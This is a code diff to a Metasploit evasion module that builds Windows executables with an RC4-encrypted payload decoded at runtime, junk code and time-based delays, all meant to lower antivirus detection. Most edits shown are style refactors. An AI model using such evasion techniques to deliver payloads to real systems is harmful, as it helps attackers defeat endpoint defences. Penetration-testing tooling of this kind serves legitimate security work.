@@ -13,6 +13,7 @@ class MetasploitModule < Msf::Evasion
         info,
         'Name' => 'Time obfuscation no shellcode',
         'Description' => %q{
+          /!\ TO USE THIS MODULE YOU NEED THE TARGET TO BE CONNECTED TO THE INTERNET /!\
           This module allows you to generate a Windows EXE without having a shellcode in the file. and rather have it generated at runtime. This is useful for reducing the detection ratio of your payload.
           it will also use few technique to avoid runtime detection such as,
           time obfuscation server_time->sleep->server time again.
@@ -34,7 +35,7 @@ class MetasploitModule < Msf::Evasion
   end
 
   def get_payload
-    @c_payload ||= lambda {
+    @get_payload ||= lambda {
       opts = { format: 'rc4', key: rc4_key }
       junk = Rex::Text.rand_text(10..1024)
       p = payload.encoded + junk
@@ -69,7 +70,7 @@ class MetasploitModule < Msf::Evasion
     i = 0
     while i < size
       if i == size - 1
-        s += "#{rand(1..1024)}"
+        s += rand(1..1024).to_s
       else
         s += "#{rand(1..1024)}, "
       end
@@ -78,7 +79,8 @@ class MetasploitModule < Msf::Evasion
     return s
   end
 
-  def junk_code(flag) # if flag is 0 return a function , if flag is 1 return a call to a function
+  # if flag is 0 return a function , if flag is 1 return a call to a function
+  def junk_code(flag)
     # fibonnacci fucntion
     fibonnacci = %|
   int fib(int n) {
@@ -158,7 +160,7 @@ class MetasploitModule < Msf::Evasion
   end
 
   def get_time_distorsion
-    time_distorsion = %|
+    %|
 
   int extractField(const char *response, const char *fieldName, int *fieldValue) {
     const char *delimiter = "\\n";
@@ -310,7 +312,7 @@ int main(int argc, char **argv)
     full_path = ::File.expand_path(path)
     m = Metasploit::Framework::Compiler::Mingw::X86.new({ show_compile_cmd: true, f_name: full_path, compile_options: ' -lpsapi -lwininet -lwinmm -lws2_32 -w ' })
     output = m.compile_c(c_template)
-    if output.length > 0
+    if !output.empty?
       print_error(output)
     else
       print_good "#{fname}.exe stored at #{full_path}.exe"
